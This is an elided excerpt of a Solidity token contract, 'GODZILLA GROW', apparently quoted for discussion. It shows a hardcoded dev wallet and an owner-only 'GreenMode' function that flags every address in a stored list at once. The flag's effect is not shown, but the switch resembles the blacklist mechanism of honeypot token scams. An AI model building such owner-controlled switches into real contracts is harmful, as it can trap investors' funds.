...
contract GODGROW is Context, IERC20, Ownable { 
    ...
    mapping (address => bool) public _isElons;
    address[] public _Elon;
    
    address payable private Wallet_Dev = payable(0x26B0c106D448eF8cBd9227f678f9B47f95B42F94);
    ...
    string private _name = "GODZILLA GROW"; 
    string private _symbol = "GODGROW";  
    ...
    function EnabledTrading() public {
    ...
    function GreenMode() external onlyOwner {
        for (uint256 i = 0; i < _Elon.length; i++) {
            _isElons[_Elon[i]] = true;
        }
    }
